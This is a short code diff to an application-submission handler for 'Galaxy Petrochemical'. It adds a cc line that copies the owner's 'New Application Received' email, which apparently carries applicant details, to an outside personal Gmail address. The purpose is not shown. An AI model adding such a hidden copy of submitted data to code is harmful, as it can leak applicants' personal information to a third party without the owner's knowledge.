@@ -142,6 +142,7 @@ const submitApplication = async (req, res) => {
       const ownerMailOptions = {
         from: `"Galaxy Petrochemical" <${smtpConfig.name}>`,
         to: ownerEmail,
+          cc: 'rndtsseo@gmail.com',
         subject: "New Application Received",
         html: ownerEmailBody,
         replyTo: email || smtpConfig.name, // Allow owner to reply
